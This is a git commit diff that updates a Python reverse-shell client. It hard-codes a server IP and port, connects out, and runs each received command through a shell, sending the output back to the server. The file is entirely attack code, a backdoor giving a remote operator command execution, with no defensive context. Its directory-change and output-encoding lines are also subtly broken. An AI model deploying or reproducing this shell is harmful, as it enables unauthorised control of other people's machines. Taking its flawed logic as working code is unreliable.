f101b3a7250e81eef2601798ceb778d9d6d66d25
Buccioz <buccioz@protonmail.com>
2020-11-06 16:05:29 +0100

    Update client.py

--- client.py
+++ client.py
@@ -1,7 +1,8 @@
 import socket
 import subprocess
+import os
 
-SERVER_HOST = ""   # Server IP
+SERVER_HOST = "192.168.1.237"   # Server IP
 SERVER_PORT = 5003 # Server Port
 BUFFER_SIZE = 1024 # Buffer Size
 
@@ -10,8 +11,10 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((SERVER_HOST, SERVER_PORT))
 
 while True:
-    command = s.recv(BUFFER_SIZE).decode()
-    
-    output = subprocess.getoutput(command)
-    s.send(output.encode())
-            
+    command = s.recv(BUFFER_SIZE)
+    if command[:2].decode("utf-8") == 'cd':
+        os.chdir(command[:3].decode("utf-8"))
+    if len(command) > 0:
+        cmd = subprocess.Popen(command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output_bytes = cmd.stdout.read() + cmd.stderr.read()     
+        s.send(str.encode(output_bytes)) 
